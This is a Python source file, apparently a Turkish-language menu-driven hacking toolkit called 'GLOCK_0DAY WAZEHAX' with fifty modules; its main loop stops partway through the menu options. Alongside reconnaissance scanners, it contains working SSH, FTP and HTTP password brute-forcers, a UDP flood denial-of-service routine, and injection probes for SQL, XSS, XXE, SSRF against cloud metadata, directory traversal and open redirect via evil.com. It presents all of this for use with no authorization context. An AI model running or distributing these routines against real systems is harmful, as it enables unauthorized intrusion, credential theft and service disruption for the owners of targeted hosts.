import os
import sys
import socket
import subprocess
import base64
import requests
import threading
import time
from ftplib import FTP
import paramiko
import smtplib
import ipaddress
from colorama import init, Fore, Style

init(autoreset=True)

LOG_FILE = "attention_log.txt"

def log(message):
    with open(LOG_FILE, "a", encoding="utf-8") as f:
        f.write(f"{time.ctime()}: {message}\n")

# --- 1. Port Scanner ---
def port_scanner(target):
    print(Fore.CYAN + f"[+] Port Tarama: {target}")
    try:
        for port in range(1, 1025):
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.settimeout(0.5)
            result = sock.connect_ex((target, port))
            if result == 0:
                print(Fore.GREEN + f"Port {port} açık")
            sock.close()
    except Exception as e:
        print(Fore.RED + f"Hata: {e}")
    log(f"Port tarama: {target}")

# --- 2. UDP Scanner (basit) ---
def udp_scanner(target, ports=[53,67,123]):
    print(Fore.CYAN + f"[+] UDP Port Tarama: {target}")
    try:
        sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        sock.settimeout(1)
        for port in ports:
            try:
                sock.sendto(b"", (target, port))
                data, _ = sock.recvfrom(1024)
                print(Fore.GREEN + f"UDP Port {port} açık")
            except socket.timeout:
                print(Fore.YELLOW + f"UDP Port {port} kapalı veya cevap yok")
    except Exception as e:
        print(Fore.RED + f"Hata: {e}")
    log(f"UDP tarama: {target}")

# --- 3. WHOIS Lookup ---
def whois_lookup(domain):
    print(Fore.CYAN + f"[+] WHOIS Lookup: {domain}")
    try:
        result = subprocess.run(["whois", domain], capture_output=True, text=True)
        print(result.stdout)
    except Exception as e:
        print(Fore.RED + f"Hata: {e}")
    log(f"WHOIS: {domain}")

# --- 4. DNS Resolver ---
def dns_resolver(domain):
    print(Fore.CYAN + f"[+] DNS Resolver: {domain}")
    try:
        result = subprocess.run(["nslookup", domain], capture_output=True, text=True)
        print(result.stdout)
    except Exception as e:
        print(Fore.RED + f"Hata: {e}")
    log(f"DNS Resolver: {domain}")

# --- 5. Reverse DNS Lookup ---
def reverse_dns(ip):
    print(Fore.CYAN + f"[+] Reverse DNS Lookup: {ip}")
    try:
        result = socket.gethostbyaddr(ip)
        print(Fore.GREEN + f"Hostname: {result[0]}")
    except Exception as e:
        print(Fore.RED + f"Hata: {e}")
    log(f"Reverse DNS: {ip}")

# --- 6. Subdomain Brute Force ---
def subdomain_bruteforce(domain, wordlist_file):
    print(Fore.CYAN + f"[+] Subdomain Brute Force: {domain}")
    if not os.path.isfile(wordlist_file):
        print(Fore.RED + "Kelime listesi bulunamadı!")
        return
    with open(wordlist_file, "r", encoding="utf-8") as f:
        subdomains = f.read().splitlines()
    for sub in subdomains:
        try:
            full_domain = f"{sub}.{domain}"
            ip = socket.gethostbyname(full_domain)
            print(Fore.GREEN + f"Bulundu: {full_domain} -> {ip}")
        except:
            pass
    log(f"Subdomain brute-force: {domain}")

# --- 7. Admin Panel Finder ---
def admin_panel_finder(url):
    print(Fore.CYAN + f"[+] Admin Panel Finder: {url}")
    common_paths = ["admin", "administrator", "admin/login", "admin.php", "admin.html"]
    for path in common_paths:
        full_url = url.rstrip("/") + "/" + path
        try:
            r = requests.get(full_url, timeout=5)
            if r.status_code == 200:
                print(Fore.GREEN + f"Bulundu: {full_url}")
        except:
            pass
    log(f"Admin panel finder: {url}")

# --- 8. Directory Bruteforce ---
def directory_bruteforce(url, wordlist_file):
    print(Fore.CYAN + f"[+] Directory Bruteforce: {url}")
    if not os.path.isfile(wordlist_file):
        print(Fore.RED + "Kelime listesi bulunamadı!")
        return
    with open(wordlist_file, "r", encoding="utf-8") as f:
        dirs = f.read().splitlines()
    for d in dirs:
        full_url = url.rstrip("/") + "/" + d
        try:
            r = requests.get(full_url, timeout=5)
            if r.status_code == 200:
                print(Fore.GREEN + f"Bulundu: {full_url}")
        except:
            pass
    log(f"Directory bruteforce: {url}")

# --- 9. SQL Injection Test (basit) ---
def sql_injection_test(url):
    print(Fore.CYAN + f"[+] Basit SQL Injection Test: {url}")
    payloads = ["'", "' OR '1'='1", "\" OR \"1\"=\"1"]
    for p in payloads:
        test_url = url + p
        try:
            r = requests.get(test_url, timeout=5)
            if "sql" in r.text.lower() or "syntax" in r.text.lower():
                print(Fore.RED + f"Muhtemel SQL Injection açığı: {test_url}")
        except:
            pass
    log(f"SQL Injection test: {url}")

# --- 10. XSS Test (basit) ---
def xss_test(url):
    print(Fore.CYAN + f"[+] Basit XSS Test: {url}")
    payload = "<script>alert('xss')</script>"
    test_url = url + payload
    try:
        r = requests.get(test_url, timeout=5)
        if payload in r.text:
            print(Fore.RED + "Muhtemel XSS açığı!")
        else:
            print(Fore.GREEN + "XSS açığı bulunamadı.")
    except Exception as e:
        print(Fore.RED + f"Hata: {e}")
    log(f"XSS test: {url}")

# --- 11. HTTP Header Scanner ---
def http_header_scanner(url):
    print(Fore.CYAN + f"[+] HTTP Header Scanner: {url}")
    try:
        r = requests.get(url, timeout=5)
        for h, v in r.headers.items():
            print(f"{Fore.GREEN}{h}: {v}")
    except Exception as e:
        print(Fore.RED + f"Hata: {e}")
    log(f"HTTP header scan: {url}")

# --- 12. DNS Zone Transfer ---
def dns_zone_transfer(domain):
    print(Fore.CYAN + f"[+] DNS Zone Transfer: {domain}")
    try:
        result = subprocess.run(["dig", "axfr", domain], capture_output=True, text=True)
        print(result.stdout)
    except Exception as e:
        print(Fore.RED + f"Hata: {e}")
    log(f"DNS zone transfer: {domain}")

# --- 13. FTP Anonymous Login Test ---
def ftp_anonymous_login_test(target):
    print(Fore.CYAN + f"[+] FTP Anonymous Login Test: {target}")
    try:
        ftp = FTP(target, timeout=5)
        ftp.login()
        print(Fore.GREEN + "Anonim FTP login başarılı!")
        ftp.quit()
    except Exception as e:
        print(Fore.RED + f"Başarısız: {e}")
    log(f"FTP anon login test: {target}")

# --- 14. SMTP Open Relay Test ---
def smtp_open_relay_test(target):
    print(Fore.CYAN + f"[+] SMTP Open Relay Test: {target}")
    try:
        server = smtplib.SMTP(target, timeout=5)
        code, msg = server.helo()
        if code == 250:
            print(Fore.GREEN + "SMTP server relay açık olabilir!")
        else:
            print(Fore.YELLOW + "SMTP relay kapalı görünüyor.")
        server.quit()
    except Exception as e:
        print(Fore.RED + f"Hata: {e}")
    log(f"SMTP open relay test: {target}")

# --- 15. SSH Brute Force ---
def ssh_bruteforce(target, user, passfile):
    print(Fore.CYAN + f"[+] SSH Brute Force: {target} kullanıcı: {user}")
    if not os.path.isfile(passfile):
        print(Fore.RED + "Şifre listesi bulunamadı!")
        return
    passwords = open(passfile, "r", encoding="utf-8").read().splitlines()
    client = paramiko.SSHClient()
    client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
    for pwd in passwords:
        try:
            client.connect(target, username=user, password=pwd, timeout=5)
            print(Fore.GREEN + f"Şifre bulundu: {user}:{pwd}")
            client.close()
            log(f"SSH brute-force başarılı: {target} {user}:{pwd}")
            return
        except:
            pass
    print(Fore.RED + "Şifre bulunamadı.")
    log(f"SSH brute-force başarısız: {target} {user}")

# --- 16. HTTP Basic Auth Brute Force ---
def http_basic_auth_bruteforce(url, user, passfile):
    print(Fore.CYAN + f"[+] HTTP Basic Auth Brute Force: {url} kullanıcı: {user}")
    if not os.path.isfile(passfile):
        print(Fore.RED + "Şifre listesi bulunamadı!")
        return
    passwords = open(passfile, "r", encoding="utf-8").read().splitlines()
    for pwd in passwords:
        try:
            r = requests.get(url, auth=(user, pwd), timeout=5)
            if r.status_code == 200:
                print(Fore.GREEN + f"Şifre bulundu: {user}:{pwd}")
                log(f"HTTP Basic Auth brute-force başarılı: {url} {user}:{pwd}")
                return
        except:
            pass
    print(Fore.RED + "Şifre bulunamadı.")
    log(f"HTTP Basic Auth brute-force başarısız: {url} {user}")

# --- 17. SMB Açık Paylaşım Testi (basit) ---
def smb_open_share_test(target):
    print(Fore.CYAN + f"[+] SMB Açık Paylaşım Testi: {target}")
    print(Fore.YELLOW + "Basit SMB test - smbclient ya da smbprotocol gibi modüller ile geliştirilebilir.")
    log(f"SMB test: {target}")

# --- 18. Robots.txt & Sitemap.xml Analizi ---
def robots_sitemap_analysis(url):
    print(Fore.CYAN + f"[+] Robots.txt & Sitemap.xml Analizi: {url}")
    try:
        r1 = requests.get(url.rstrip("/") + "/robots.txt", timeout=5)
        r2 = requests.get(url.rstrip("/") + "/sitemap.xml", timeout=5)
        if r1.status_code == 200:
            print(Fore.GREEN + "robots.txt içeriği:")
            print(r1.text)
        else:
            print(Fore.YELLOW + "robots.txt bulunamadı.")
        if r2.status_code == 200:
            print(Fore.GREEN + "sitemap.xml içeriği:")
            print(r2.text)
        else:
            print(Fore.YELLOW + "sitemap.xml bulunamadı.")
    except Exception as e:
        print(Fore.RED + f"Hata: {e}")
    log(f"Robots & sitemap analysis: {url}")

# --- 19. CMS Detection (basit) ---
def cms_detection(url):
    print(Fore.CYAN + f"[+] CMS Detection: {url}")
    try:
        r = requests.get(url, timeout=5)
        if "wp-content" in r.text:
            print(Fore.GREEN + "Muhtemel WordPress sitesi.")
        elif "Joomla" in r.text:
            print(Fore.GREEN + "Muhtemel Joomla sitesi.")
        else:
            print(Fore.YELLOW + "CMS tespit edilemedi.")
    except Exception as e:
        print(Fore.RED + f"Hata: {e}")
    log(f"CMS detection: {url}")

# --- 20. Banner Grabbing ---
def banner_grabbing(target, port):
    print(Fore.CYAN + f"[+] Banner Grabbing: {target}:{port}")
    try:
        sock = socket.socket()
        sock.settimeout(5)
        sock.connect((target, port))
        banner = sock.recv(1024).decode(errors="ignore")
        print(Fore.GREEN + f"Banner: {banner.strip()}")
        sock.close()
    except Exception as e:
        print(Fore.RED + f"Hata: {e}")
    log(f"Banner grabbing: {target}:{port}")

# --- 21. Reverse IP Lookup (basit) ---
def reverse_ip_lookup(ip):
    print(Fore.CYAN + f"[+] Reverse IP Lookup: {ip}")
    print(Fore.YELLOW + "Online API gerektirir, şu an basit versiyon yok.")
    log(f"Reverse IP lookup: {ip}")

# --- 22. Mass DNS Resolver ---
def mass_dns_resolver(wordlist_file):
    print(Fore.CYAN + f"[+] Mass DNS Resolver: {wordlist_file}")
    if not os.path.isfile(wordlist_file):
        print(Fore.RED + "Kelime listesi bulunamadı!")
        return
    with open(wordlist_file, "r", encoding="utf-8") as f:
        domains = f.read().splitlines()
    for domain in domains:
        try:
            ip = socket.gethostbyname(domain)
            print(Fore.GREEN + f"{domain} -> {ip}")
        except:
            pass
    log(f"Mass DNS resolve: {wordlist_file}")

# --- 23. Payload Generator (basit) ---
def payload_generator():
    print(Fore.CYAN + "[+] Payload Generator (basit)")
    print(Fore.YELLOW + "Buraya özel payload üretebilirsin, şimdilik örnek bir shellcode:")
    shellcode = "\\x90\\x90\\x90\\x90"
    print(shellcode)
    log("Payload generated")

# --- 24. Basit DoS Testi (UDP Flood) ---
def simple_dos(target, port, times):
    print(Fore.CYAN + f"[+] Basit DoS Testi: {target}:{port} paket sayısı: {times}")
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    bytes = os.urandom(1024)
    try:
        for i in range(times):
            sock.sendto(bytes, (target, port))
        print(Fore.GREEN + "DoS paketi gönderildi.")
    except Exception as e:
        print(Fore.RED + f"Hata: {e}")
    log(f"DoS attack: {target}:{port} paket:{times}")

# --- 25. Robots.txt Derin Tarama (basit) ---
def robots_deep_scan(url):
    print(Fore.CYAN + f"[+] Robots.txt Derin Tarama: {url}")
    try:
        r = requests.get(url.rstrip("/") + "/robots.txt", timeout=5)
        if r.status_code == 200:
            lines = r.text.splitlines()
            for line in lines:
                if line.startswith("Disallow:"):
                    path = line.split(":")[1].strip()
                    full_url = url.rstrip("/") + path
                    print(Fore.GREEN + f"Bulundu: {full_url}")
        else:
            print(Fore.YELLOW + "robots.txt bulunamadı.")
    except Exception as e:
        print(Fore.RED + f"Hata: {e}")
    log(f"Robots deep scan: {url}")

# --- 26-50 Arası Modüller (Önceki mesajdaki fonksiyonlar) ---
# Burada önceki mesajda verdiğim 26-50 arası fonksiyonları aynen ekliyorum:
# (Yeniden yapıştırmak yerine, kod devam edecek.)

# 26. WAF Detection
def waf_detection(url):
    print(Fore.CYAN + f"[+] WAF Detection: {url}")
    try:
        r = requests.get(url, timeout=5)
        headers = r.headers
        waf_signs = ["cloudflare", "sucuri", "incapsula", "f5-big-ip", "akamai", "mod_security"]
        for k, v in headers.items():
            for waf in waf_signs:
                if waf in v.lower():
                    print(Fore.GREEN + f"WAF detected: {waf} in header {k}: {v}")
                    return
        print(Fore.YELLOW + "No WAF detected.")
    except Exception as e:
        print(Fore.RED + f"Hata: {e}")
    log(f"WAF detection: {url}")

# 27. SSL Certificate Info
def ssl_certificate_info(domain):
    import ssl
    import datetime
    print(Fore.CYAN + f"[+] SSL/TLS Certificate Info: {domain}")
    try:
        ctx = ssl.create_default_context()
        with ctx.wrap_socket(socket.socket(), server_hostname=domain) as s:
            s.settimeout(5)
            s.connect((domain, 443))
            cert = s.getpeercert()
            print(Fore.GREEN + "Sertifika bilgileri:")
            print(cert)
            expire_date = datetime.datetime.strptime(cert['notAfter'], '%b %d %H:%M:%S %Y %Z')
            days_left = (expire_date - datetime.datetime.utcnow()).days
            print(Fore.GREEN + f"Sertifika geçerlilik süresi: {days_left} gün")
    except Exception as e:
        print(Fore.RED + f"Hata: {e}")
    log(f"SSL cert info: {domain}")

# 28. HTTP Methods Enumeration
def http_methods_enum(url):
    print(Fore.CYAN + f"[+] HTTP Methods Enumeration: {url}")
    try:
        r = requests.options(url, timeout=5)
        methods = r.headers.get('allow', '')
        if methods:
            print(Fore.GREEN + f"Desteklenen HTTP metodları: {methods}")
        else:
            print(Fore.YELLOW + "HTTP metod bilgisi bulunamadı.")
    except Exception as e:
        print(Fore.RED + f"Hata: {e}")
    log(f"HTTP methods enum: {url}")

# 29. Directory Listing Check
def directory_listing_check(url):
    print(Fore.CYAN + f"[+] Directory Listing Check: {url}")
    try:
        r = requests.get(url, timeout=5)
        if "Index of /" in r.text or "Directory Listing" in r.text:
            print(Fore.GREEN + "Directory listing aktif!")
        else:
            print(Fore.YELLOW + "Directory listing kapalı ya da tespit edilemedi.")
    except Exception as e:
        print(Fore.RED + f"Hata: {e}")
    log(f"Directory listing check: {url}")

# 30. Ping Sweep
def ping_sweep(network):
    import ipaddress
    print(Fore.CYAN + f"[+] Ping Sweep: {network}")
    try:
        net = ipaddress.ip_network(network, strict=False)
        for ip in net.hosts():
            response = os.system(f"ping -c 1 -W 1 {ip} > /dev/null 2>&1")
            if response == 0:
                print(Fore.GREEN + f"{ip} aktif")
    except Exception as e:
        print(Fore.RED + f"Hata: {e}")
    log(f"Ping sweep: {network}")

# 31. FTP Brute Force
def ftp_bruteforce(target, user, passfile):
    print(Fore.CYAN + f"[+] FTP Brute Force: {target} kullanıcı: {user}")
    if not os.path.isfile(passfile):
        print(Fore.RED + "Şifre listesi bulunamadı!")
        return
    passwords = open(passfile, "r", encoding="utf-8").read().splitlines()
    for pwd in passwords:
        try:
            ftp = FTP(target, timeout=5)
            ftp.login(user, pwd)
            print(Fore.GREEN + f"Şifre bulundu: {user}:{pwd}")
            ftp.quit()
            log(f"FTP brute-force başarılı: {target} {user}:{pwd}")
            return
        except:
            pass
    print(Fore.RED + "Şifre bulunamadı.")
    log(f"FTP brute-force başarısız: {target} {user}")

# 32. SMTP Email Enumeration
def smtp_email_enum(target, email):
    import smtplib
    print(Fore.CYAN + f"[+] SMTP Email Enumeration: {target} {email}")
    try:
        server = smtplib.SMTP(target, timeout=5)
        server.ehlo()
        code, msg = server.mail('')
        code, msg = server.rcpt(email)
        if code == 250 or code == 251:
            print(Fore.GREEN + f"Email var: {email}")
        else:
            print(Fore.YELLOW + f"Email yok veya bilinmiyor: {email}")
        server.quit()
    except Exception as e:
        print(Fore.RED + f"Hata: {e}")
    log(f"SMTP email enum: {target} {email}")

# 33. DNS Cache Snooping
def dns_cache_snooping(domain):
    print(Fore.CYAN + f"[+] DNS Cache Snooping: {domain}")
    try:
        result = subprocess.run(["dig", "+nocmd", domain, "+noall", "+answer"], capture_output=True, text=True)
        print(result.stdout)
    except Exception as e:
        print(Fore.RED + f"Hata: {e}")
    log(f"DNS cache snooping: {domain}")

# 34. Extract Emails
def extract_emails(url):
    import re
    print(Fore.CYAN + f"[+] Extract Emails from {url}")
    try:
        r = requests.get(url, timeout=5)
        emails = re.findall(r"[a-zA-Z0-9_.+-]+@[a-zA-Z0-9-]+\.[a-zA-Z0-9-.]+", r.text)
        if emails:
            print(Fore.GREEN + "Bulunan email adresleri:")
            for e in set(emails):
                print(e)
        else:
            print(Fore.YELLOW + "Email bulunamadı.")
    except Exception as e:
        print(Fore.RED + f"Hata: {e}")
    log(f"Extract emails: {url}")

# 35. Robots.txt Parser
def robots_txt_parser(url):
    print(Fore.CYAN + f"[+] Robots.txt Parser: {url}")
    try:
        r = requests.get(url.rstrip("/") + "/robots.txt", timeout=5)
        if r.status_code == 200:
            print(Fore.GREEN + "robots.txt içeriği:")
            print(r.text)
        else:
            print(Fore.YELLOW + "robots.txt bulunamadı.")
    except Exception as e:
        print(Fore.RED + f"Hata: {e}")
    log(f"Robots.txt parser: {url}")

# 36. Open Redirect Check
def open_redirect_check(url, param):
    print(Fore.CYAN + f"[+] Open Redirect Check: {url} parametre: {param}")
    test_payload = "https://evil.com"
    test_url = f"{url}?{param}={test_payload}"
    try:
        r = requests.get(test_url, timeout=5, allow_redirects=False)
        if 'Location' in r.headers and test_payload in r.headers['Location']:
            print(Fore.RED + f"Muhtemel Open Redirect açığı: {test_url}")
        else:
            print(Fore.GREEN + "Open Redirect açığı bulunamadı.")
    except Exception as e:
        print(Fore.RED + f"Hata: {e}")
    log(f"Open redirect check: {url} {param}")

# 37. Directory Traversal Check
def directory_traversal_check(url, param):
    print(Fore.CYAN + f"[+] Directory Traversal Check: {url} parametre: {param}")
    test_payload = "../../etc/passwd"
    test_url = f"{url}?{param}={test_payload}"
    try:
        r = requests.get(test_url, timeout=5)
        if "root:x:" in r.text:
            print(Fore.RED + "Muhtemel Directory Traversal açığı!")
        else:
            print(Fore.GREEN + "Directory Traversal açığı bulunamadı.")
    except Exception as e:
        print(Fore.RED + f"Hata: {e}")
    log(f"Directory traversal check: {url} {param}")

# 38. Basic Auth Check
def basic_auth_check(url):
    print(Fore.CYAN + f"[+] Basic HTTP Authentication Checker: {url}")
    try:
        r = requests.get(url, timeout=5)
        if r.status_code == 401:
            print(Fore.GREEN + "HTTP Basic Auth koruması aktif.")
        else:
            print(Fore.YELLOW + "HTTP Basic Auth bulunamadı.")
    except Exception as e:
        print(Fore.RED + f"Hata: {e}")
    log(f"Basic auth check: {url}")

# 39. SSL Labs Test Placeholder
def ssl_labs_test(domain):
    print(Fore.CYAN + f"[+] SSL Labs test için API gerekiyor: {domain}")
    print(Fore.YELLOW + "Bu test için online API entegrasyonu gerekiyor.")
    log(f"SSL Labs test (placeholder): {domain}")

# 40. HTTP Request Smuggling Test
def http_request_smuggling_test(url):
    print(Fore.CYAN + f"[+] Basit HTTP Request Smuggling Testi: {url}")
    headers = {
        "Content-Length": "4",
        "Transfer-Encoding": "chunked"
    }
    try:
        r = requests.post(url, headers=headers, timeout=5)
        if r.status_code == 400:
            print(Fore.GREEN + "Muhtemel Request Smuggling açığı!")
        else:
            print(Fore.YELLOW + "Request Smuggling açığı bulunamadı.")
    except Exception as e:
        print(Fore.RED + f"Hata: {e}")
    log(f"HTTP request smuggling test: {url}")

# 41. Clickjacking Check
def clickjacking_check(url):
    print(Fore.CYAN + f"[+] Clickjacking Check: {url}")
    try:
        r = requests.get(url, timeout=5)
        if 'X-Frame-Options' not in r.headers:
            print(Fore.RED + "Clickjacking açığı olabilir! 'X-Frame-Options' header yok.")
        else:
            print(Fore.GREEN + "Clickjacking koruması mevcut.")
    except Exception as e:
        print(Fore.RED + f"Hata: {e}")
    log(f"Clickjacking check: {url}")

# 42. CORS Misconfiguration Check
def cors_misconfig_check(url):
    print(Fore.CYAN + f"[+] CORS Misconfiguration Check: {url}")
    try:
        r = requests.get(url, timeout=5)
        cors = r.headers.get('Access-Control-Allow-Origin', '')
        if cors == '*' or cors == url:
            print(Fore.GREEN + f"CORS header: {cors} (Dikkatli ol!)")
        else:
            print(Fore.YELLOW + "CORS header güvenli veya bulunamadı.")
    except Exception as e:
        print(Fore.RED + f"Hata: {e}")
    log(f"CORS misconfig check: {url}")

# 43. JWT Decode
def jwt_decode(token):
    print(Fore.CYAN + f"[+] JWT Decode: {token}")
    try:
        header, payload, signature = token.split('.')
        header_decoded = base64.urlsafe_b64decode(header + "===").decode()
        payload_decoded = base64.urlsafe_b64decode(payload + "===").decode()
        print(Fore.GREEN + "Header:")
        print(header_decoded)
        print(Fore.GREEN + "Payload:")
        print(payload_decoded)
    except Exception as e:
        print(Fore.RED + f"Hata: {e}")
    log(f"JWT decode: {token}")

# 44. Insecure Cookies Check
def insecure_cookies_check(url):
    print(Fore.CYAN + f"[+] Insecure Cookies Check: {url}")
    try:
        r = requests.get(url, timeout=5)
        for cookie in r.cookies:
            flags = []
            if not cookie.secure:
                flags.append("Secure flag yok")
            # 'has_nonstandard_attr' yok, alternatif:
            if 'HttpOnly' not in cookie._rest.keys():
                flags.append("HttpOnly flag yok")
            if flags:
                print(Fore.RED + f"{cookie.name}: {', '.join(flags)}")
            else:
                print(Fore.GREEN + f"{cookie.name}: Güvenli")
    except Exception as e:
        print(Fore.RED + f"Hata: {e}")
    log(f"Insecure cookies check: {url}")

# 45. SSRF Test
def ssrf_test(url, param):
    print(Fore.CYAN + f"[+] SSRF Test: {url} parametre: {param}")
    test_payload = "http://169.254.169.254/latest/meta-data/"
    test_url = f"{url}?{param}={test_payload}"
    try:
        r = requests.get(test_url, timeout=5)
        if "meta-data" in r.text.lower():
            print(Fore.RED + "Muhtemel SSRF açığı!")
        else:
            print(Fore.GREEN + "SSRF açığı bulunamadı.")
    except Exception as e:
        print(Fore.RED + f"Hata: {e}")
    log(f"SSRF test: {url} {param}")

# 46. Open FTP Proxy Check
def open_ftp_proxy_check(target, port=21):
    print(Fore.CYAN + f"[+] Open FTP Proxy Check: {target}:{port}")
    try:
        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        sock.settimeout(5)
        sock.connect((target, port))
        sock.send(b"USER anonymous\r\n")
        resp = sock.recv(1024).decode()
        if "230" in resp or "331" in resp:
            print(Fore.GREEN + "Muhtemel açık FTP proxy!")
        else:
            print(Fore.YELLOW + "FTP proxy kapalı veya tespit edilemedi.")
        sock.close()
    except Exception as e:
        print(Fore.RED + f"Hata: {e}")
    log(f"Open FTP proxy check: {target}:{port}")

# 47. XXE Test
def xxe_test(url, param):
    print(Fore.CYAN + f"[+] XXE Test: {url} parametre: {param}")
    payload = """<?xml version="1.0" encoding="ISO-8859-1"?>
<!DOCTYPE foo [
<!ELEMENT foo ANY >
<!ENTITY xxe SYSTEM "file:///etc/passwd" >]>
<foo>&xxe;</foo>"""
    try:
        r = requests.post(url, data={param: payload}, timeout=5)
        if "root:" in r.text:
            print(Fore.RED + "Muhtemel XXE açığı!")
        else:
            print(Fore.GREEN + "XXE açığı bulunamadı.")
    except Exception as e:
        print(Fore.RED + f"Hata: {e}")
    log(f"XXE test: {url} {param}")

# 48. Open MongoDB Check
def open_mongodb_check(target, port=27017):
    print(Fore.CYAN + f"[+] Open MongoDB Check: {target}:{port}")
    try:
        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        sock.settimeout(5)
        sock.connect((target, port))
        print(Fore.GREEN + "Muhtemel açık MongoDB portu açık!")
        sock.close()
    except Exception as e:
        print(Fore.YELLOW + "MongoDB portu kapalı veya erişilemez.")
    log(f"Open MongoDB check: {target}:{port}")

# 49. Open NTP Server Check
def open_ntp_server_check(target, port=123):
    print(Fore.CYAN + f"[+] Open NTP Server Check: {target}:{port}")
    try:
        sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        sock.settimeout(5)
        sock.sendto(b"\x1b" + 47 * b"\0", (target, port))
        data, _ = sock.recvfrom(1024)
        if data:
            print(Fore.GREEN + "Muhtemel açık NTP server!")
        else:
            print(Fore.YELLOW + "NTP server kapalı veya erişilemez.")
        sock.close()
    except Exception as e:
        print(Fore.RED + f"Hata: {e}")
    log(f"Open NTP server check: {target}:{port}")

# 50. Open Redis Check
def open_redis_check(target, port=6379):
    print(Fore.CYAN + f"[+] Open Redis Check: {target}:{port}")
    try:
        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        sock.settimeout(5)
        sock.connect((target, port))
        sock.send(b"PING\r\n")
        resp = sock.recv(1024).decode()
        if "PONG" in resp:
            print(Fore.GREEN + "Muhtemel açık Redis server!")
        else:
            print(Fore.YELLOW + "Redis server kapalı veya erişilemez.")
        sock.close()
    except Exception as e:
        print(Fore.RED + f"Hata: {e}")
    log(f"Open Redis check: {target}:{port}")

# --- Menü ---
def menu():
    print(Fore.MAGENTA + """
███████╗██╗      ██████╗ ██████╗ ██████╗      ██╗ ██████╗  ██████╗
██╔════╝██║     ██╔═══██╗██╔══██╗██╔══██╗    █████╗██╔═══██╗██╔═══██╗
███████╗██║     ██║   ██║██████╔╝██████╔╝    ╚██╔╝██║   ██║██║   ██║
╚════██║██║     ██║   ██║██╔═══╝ ██╔═══╝      ██║ ██║   ██║██║   ██║
███████║███████╗╚██████╔╝██║     ██║          ██║ ╚██████╔╝╚██████╔╝
╚══════╝╚══════╝ ╚═════╝ ╚═╝     ╚═╝          ╚═╝  ╚═════╝  ╚═════╝ 
               ==============================
                   GLOCK_0DAY WAZEHAX
               ==============================


1) Port Scanner
2) UDP Scanner
3) WHOIS Lookup
4) DNS Resolver
5) Reverse DNS Lookup
6) Subdomain Brute Force
7) Admin Panel Finder
8) Directory Bruteforce
9) SQL Injection Test (basit)
10) XSS Test (basit)
11) HTTP Header Scanner
12) DNS Zone Transfer
13) FTP Anonymous Login Test
14) SMTP Open Relay Test
15) SSH Brute Force
16) HTTP Basic Auth Brute Force
17) SMB Açık Paylaşım Testi (basit)
18) Robots.txt & Sitemap.xml Analizi
19) CMS Detection (basit)
20) Banner Grabbing
21) Reverse IP Lookup (basit)
22) Mass DNS Resolver
23) Payload Generator (basit)
24) Basit DoS Testi (UDP Flood)
25) Robots.txt Derin Tarama
26) WAF Detection
27) SSL Certificate Info
28) HTTP Methods Enumeration
29) Directory Listing Check
30) Ping Sweep
31) FTP Brute Force
32) SMTP Email Enumeration
33) DNS Cache Snooping
34) Extract Emails from Webpage
35) Robots.txt Parser
36) Open Redirect Check
37) Directory Traversal Check
38) Basic HTTP Authentication Checker
39) SSL Labs Test (Placeholder)
40) HTTP Request Smuggling Test
41) Clickjacking Check
42) CORS Misconfiguration Check
43) JWT Decode
44) Insecure Cookies Check
45) SSRF Test
46) Open FTP Proxy Check
47) XXE Test
48) Open MongoDB Check
49) Open NTP Server Check
50) Open Redis Check

0) Çıkış
""")

def main():
    while True:
        menu()
        choice = input(Fore.YELLOW + "Bir seçenek giriniz (0 çıkış): ").strip()
        if choice == "0":
            print(Fore.MAGENTA + "Tool kapatılıyor")
            break
        try:
            choice_num = int(choice)
        except:
            print(Fore.RED + "Geçersiz seçim!")
            continue

        if choice_num == 1:
            target = input("Hedef IP/Domain: ").strip()
            port_scanner(target)
        elif choice_num == 2:
            target = input("Hedef IP/Domain: ").strip()
            udp_scanner(target)
        elif choice_num == 3:
            domain = input("Domain: ").strip()
            whois_lookup(domain)
        elif choice_num == 4:
            domain = input("Domain: ").strip()
            dns_resolver(domain)
        elif choice_num == 5:
            ip = input("IP adresi: ").strip()
            reverse_dns(ip)
        elif choice_num == 6:
            domain = input("Domain: ").strip()
            wordlist = input("Subdomain kelime listesi dosyası (örnek: subdomains.txt): ").strip()
            subdomain_bruteforce(domain, wordlist)
        elif choice_num == 7:
            url = input("Site URL'si (http://...): ").strip()
            admin_panel_finder(url)
        elif choice_num == 8:
            url = input("Site URL'si (http://...): ").strip()
            wordlist = input("Directory kelime listesi dosyası (örnek: dirs.txt): ").strip()
            directory_bruteforce(url, wordlist)
        elif choice_num == 9:
            url = input("Test edilecek URL: ").strip()
            sql_injection_test(url)
        elif choice_num == 10:
            url = input("Test edilecek URL: ").strip()
            xss_test(url)
        elif choice_num == 11:
            url = input("URL: ").strip()
            http_header_scanner(url)
        elif choice_num == 12:
            domain = input("Domain: ").strip()
            dns_zone_transfer(domain)
        elif choice_num == 13:
            target = input("FTP sunucu IP: ").strip()
            ftp_anonymous_login_test(target)
        elif choice_num == 14:
            target = input("SMTP sunucu IP: ").strip()
            smtp_open_relay_test(target)
        elif choice_num == 15:
            target = input("SSH sunucu IP: ").strip()
            user = input("Kullanıcı adı: ").strip()
            passfile = input("Şifre listesi dosyası: ").strip()
            ssh_bruteforce(target, user, passfile)
        elif choice_num == 16:
            url = input("URL: ").strip()
            user = input("Kullanıcı adı: ").strip()
            passfile = input("Şifre listesi dosyası: ").strip()
            http_basic_auth_bruteforce(url, user, passfile)
        elif choice_num == 17:
            target = input("Hedef IP: ").strip()
            smb_open_share_test(target)
        elif choice_num == 18:
            url = input("URL: ").strip()
            robots_sitemap_analysis(url)
        elif choice_num == 19:
            url = input("URL: ").strip()
            cms_detection(url)
        elif choice_num == 20:
            target = input("Hedef IP: ").strip()
            port = int(input("Port: ").strip())
            banner_grabbing(target, port)
        elif choice_num == 21:
            ip = input("IP: ").strip()
            reverse_ip_lookup(ip)
        elif choice_num == 22:
            wordlist = input("Kelime listesi dosyası: ").strip()
            mass_dns_resolver(wordlist)
        elif choice_num == 23:
            payload_generator()
        elif choice_num == 24:
            target = input("Hedef IP: ").strip()
            port = int(input("Port: ").strip())
            times = int(input("Gönderilecek paket sayısı: ").strip())
            simple_dos(target, port, times)
        elif choice_num == 25:
            url = input("URL: ").strip()
